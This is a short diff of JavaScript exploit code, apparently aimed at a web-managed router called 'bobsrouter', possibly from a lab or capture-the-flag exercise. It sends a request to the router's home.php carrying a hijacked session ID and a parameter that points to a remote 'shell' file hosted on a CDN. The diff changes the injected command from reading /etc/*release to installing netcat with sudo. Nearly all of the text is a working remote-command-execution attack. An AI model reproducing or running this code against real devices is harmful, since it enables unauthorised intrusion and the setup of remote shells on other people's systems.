@@ -33,7 +33,7 @@ xhr.onreadystatechange = function() {
 		}
 
 		const SHELL = "https://cdn.jsdelivr.net/gh/dspencer12/bobsrouter@0.29/shell";
-		const cmd = "cat /etc/*release";
+		const cmd = "sudo apt-get -y install netcat; which nc";
 
 		xhr2.open("GET", ROUTER + "/home.php?action=" + encodeURIComponent(SHELL) + "&x=" + encodeURIComponent(cmd) + "&PHPSESSID=" + sessionId, true);
 		xhr2.send('');
